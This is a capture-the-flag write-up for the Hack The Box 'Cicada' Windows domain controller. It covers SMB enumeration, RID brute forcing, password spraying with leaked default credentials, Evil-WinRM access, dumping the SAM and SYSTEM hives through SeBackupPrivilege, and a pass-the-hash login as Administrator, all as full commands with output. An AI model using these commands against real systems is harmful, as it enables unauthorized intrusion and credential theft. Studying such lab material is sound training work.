---
tags:
  - HTB
  - Hacking
  - Boot2Root
  - Windows
  - SeBackupPrivilege
---
# Overview

| Name        | Cicada    |
| ----------- | --------- |
| OS          | Windows   |
| Base Points | Easy [20] |
| Status      | Done      |
# Recon
## Nmap 

```bash
$ sudo nmap -sC -sV 10.129.248.157
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-17 02:57 CDT
Nmap scan report for 10.129.248.157
Host is up (0.077s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-17 14:58:08Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-17T14:59:30+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-17T14:59:30+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-17T14:59:30+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-17T14:59:29+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-10-17T14:58:53
|_  start_date: N/A
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s
```

```bash
echo "10.129.248.157 cicada.htb" | sudo tee -a /etc/hosts
```
# Enumeration

```bash
$ nxc smb cicada.htb -u 'guest' -p '' --shares
SMB         10.129.248.157  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.248.157  445    CICADA-DC        [+] cicada.htb\guest: 
SMB         10.129.248.157  445    CICADA-DC        [*] Enumerated shares
SMB         10.129.248.157  445    CICADA-DC        Share           Permissions     Remark
SMB         10.129.248.157  445    CICADA-DC        -----           -----------     ------
SMB         10.129.248.157  445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.129.248.157  445    CICADA-DC        C$                              Default share
SMB         10.129.248.157  445    CICADA-DC        DEV                             
SMB         10.129.248.157  445    CICADA-DC        HR              READ            
SMB         10.129.248.157  445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.129.248.157  445    CICADA-DC        NETLOGON                        Logon server share 
SMB         10.129.248.157  445    CICADA-DC        SYSVOL                          Logon server shares
```

```bash
$ smbclient //cicada.htb/HR
Password for [WORKGROUP\ninjathebox98w1]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 14 07:29:09 2024
  ..                                  D        0  Thu Mar 14 07:21:29 2024
  Notice from HR.txt                  A     1266  Wed Aug 28 12:31:48 2024

		4168447 blocks of size 4096. 459390 blocks available
smb: \> get "Notice from HR.txt"
getting file \Notice from HR.txt of size 1266 as Notice from HR.txt (3.5 KiloBytes/sec) (average 3.5 KiloBytes/sec)
smb: \> exit

$ cat Notice\ from\ HR.txt 

Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, dont hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp
```

We get pass `Cicada$M6Corpb*@Lp#nZp!8` lets brute force username.
## RID Brute Force

```bash
$ nxc smb 10.129.248.157 -u 'guest' -p '' --rid-brute | grep "SidTypeUser" | sed -E 's/.*CICADA\\([^ ]+).*/\1/' > users.txt
```
## Password Spray

```bash
$ nxc smb cicada.htb -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
SMB         10.129.248.157  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.248.157  445    CICADA-DC        [-] cicada.htb\Administrator:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.248.157  445    CICADA-DC        [-] cicada.htb\Guest:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.248.157  445    CICADA-DC        [-] cicada.htb\krbtgt:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.248.157  445    CICADA-DC        [-] cicada.htb\CICADA-DC$:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.248.157  445    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.248.157  445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.248.157  445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
```

`michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8` works.

Enumerate more users.

```bash
$ nxc smb cicada.htb -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
SMB         10.129.248.157  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.248.157  445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
SMB         10.129.248.157  445    CICADA-DC        -Username-                    -Last PW Set-       -BadPW- -Description-           
SMB         10.129.248.157  445    CICADA-DC        Administrator                 2024-08-26 20:08:03 1       Built-in account for administering the computer/domain
SMB         10.129.248.157  445    CICADA-DC        Guest                         2024-08-28 17:26:56 1       Built-in account for guest access to the computer/domain
SMB         10.129.248.157  445    CICADA-DC        krbtgt                        2024-03-14 11:14:10 1       Key Distribution Center Service Account
SMB         10.129.248.157  445    CICADA-DC        john.smoulder                 2024-03-14 12:17:29 1        
SMB         10.129.248.157  445    CICADA-DC        sarah.dantelia                2024-03-14 12:17:29 1        
SMB         10.129.248.157  445    CICADA-DC        michael.wrightson             2024-03-14 12:17:29 0        
SMB         10.129.248.157  445    CICADA-DC        david.orelious                2024-03-14 12:17:29 0       Just in case I forget my password is aRt$Lp#7t*VQ!3
SMB         10.129.248.157  445    CICADA-DC        emily.oscars                  2024-08-22 21:20:17 0      
```

We get another creds `david.orelious:aRt$Lp#7t*VQ!3`.
# Initial Foothold

```bash
$ nxc smb cicada.htb -u david.orelious -p 'aRt$Lp#7t*VQ!3' --shares
SMB         10.129.248.157  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.248.157  445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3 
SMB         10.129.248.157  445    CICADA-DC        [*] Enumerated shares
SMB         10.129.248.157  445    CICADA-DC        Share           Permissions     Remark
SMB         10.129.248.157  445    CICADA-DC        -----           -----------     ------
SMB         10.129.248.157  445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.129.248.157  445    CICADA-DC        C$                              Default share
SMB         10.129.248.157  445    CICADA-DC        DEV             READ            
SMB         10.129.248.157  445    CICADA-DC        HR              READ            
SMB         10.129.248.157  445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.129.248.157  445    CICADA-DC        NETLOGON        READ            Logon server share 
SMB         10.129.248.157  445    CICADA-DC        SYSVOL          READ            Logon server share 
```

```bash
$ smbclient //cicada.htb/DEV -U 'david.orelious%aRt$Lp#7t*VQ!3'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 14 07:31:39 2024
  ..                                  D        0  Thu Mar 14 07:21:29 2024
  Backup_script.ps1                   A      601  Wed Aug 28 12:28:22 2024

		4168447 blocks of size 4096. 459264 blocks available
smb: \> get Backup_script.ps1 
getting file \Backup_script.ps1 of size 601 as Backup_script.ps1 (1.4 KiloBytes/sec) (average 1.4 KiloBytes/sec)
smb: \> exit
```

```bash
$ cat Backup_script.ps1 

$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```

We get another creds and we can EvilWinRM with it.

```bash
$ evil-winrm -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt' -i cicada.htb

*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> cat user.txt
d0245360de0a686c8fcabb6b0c44d6c0
```
# Privilege Escalation

```bash
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```
## `SeBackupPrivilege` 

This means that in a realistic scenario, a user account should not be granted this privilege as they effectively have access to sensitive files such as the SYSTEM and SAM Windows Registry Hives.

```powershell
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> reg save hklm\sam sam
The operation completed successfully.

*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> reg save hklm\system system
The operation completed successfully.
```

```powershell
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> download sam
                                        
Info: Downloading C:\Users\emily.oscars.CICADA\Desktop\sam to sam
                                        
Info: Download successful!
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> download system
                                        
Info: Downloading C:\Users\emily.oscars.CICADA\Desktop\system to system
                                        
Info: Download successful!
```

```bash
$ impacket-secretsdump -sam sam -system system local
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up... 
```

```bash
evil-winrm -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341 -i cicada.htb
```

```bash
$ evil-winrm -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341 -i cicada.htb
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\root.txt
b4ad5920b1144568fc7112230e782976
```

---


